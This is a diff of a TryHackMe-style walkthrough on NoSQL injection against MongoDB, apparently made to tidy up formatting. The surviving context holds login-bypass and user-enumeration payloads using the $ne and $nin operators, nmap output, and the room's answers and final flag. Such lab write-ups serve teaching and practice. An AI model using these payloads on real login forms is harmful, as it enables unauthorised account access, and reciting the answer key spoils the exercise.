@@ -3,7 +3,6 @@ A walkthrough depicting basic NoSQL injections on MongoDB.
 ---
 ![](https://i.imgur.com/1rvK8WH.jpg)
 
-
 ![222](https://tryhackme-images.s3.amazonaws.com/room-icons/a799d8a85c0b7381d17f860b0405b103.png)
 
 ###  NoSQL Basics
@@ -72,7 +71,6 @@ Using the MongoDB Operator Reference, find an operator to filter data when a fie
 
 *0*
 
-
 ###  NoSQL injection
 
  Start Machine
@@ -108,7 +106,6 @@ The problem that remains unsolved is how to pass an array as part of a POST HTTP
 `**user[$ne]=xxxx&pass[$ne]=yyyy**`
 
 So let's fire up our favourite proxy and try to test this. For this guide we will be using Burp Proxy.
-
 
 ### Bypassing the Login Screen
 
@@ -228,7 +225,6 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 15.80 seconds
 
-
 user[$ne]=witty&pass[$ne]=witty1&remember=on
 
 do intercept to this request
@@ -238,18 +234,11 @@ Password:	************
 Full Name:	
 email:	admin@nosql.int
 
-
-
 ```
-
-![[Pasted image 20230101150357.png]]
-
-![[Pasted image 20230101151209.png]]
 
 When bypassing the login screen using the $ne operator, which user are you logged in as?
 
 *admin*
-
 
 ### Logging in as Other Users
 
@@ -289,7 +278,6 @@ Password:	************
 Full Name:	
 email:	pcollins@nosql.int
 
-
 user[$nin][]=admin&user[$nin][]=pedro&pass[$ne]=witty1&remember=on
 
 do intercept
@@ -307,7 +295,6 @@ error cz only there are 3 users
 
 ```
 
-
 How many users are there in total?
 
 *3*
@@ -315,7 +302,6 @@ How many users are there in total?
 There is a user that starts with the letter "p". What is his username?
 
 *pedro*
-
 
 ### Extracting Users' Passwords
 
@@ -490,7 +476,6 @@ drwx------ 2 pedro pedro 4.0K Jun 23  2021 .cache
 
 and visit http://10.8.19.103/
 
-
 ```
 
 What is john's password?
@@ -500,7 +485,5 @@ What is john's password?
 One of the users seems to be reusing his password for many services. Find which one and connect through SSH to retrieve the final flag!
 
 *flag{N0Sql_n01iF3!}*
-
-
 
 [[Atlassian, CVE-2022-26134]]
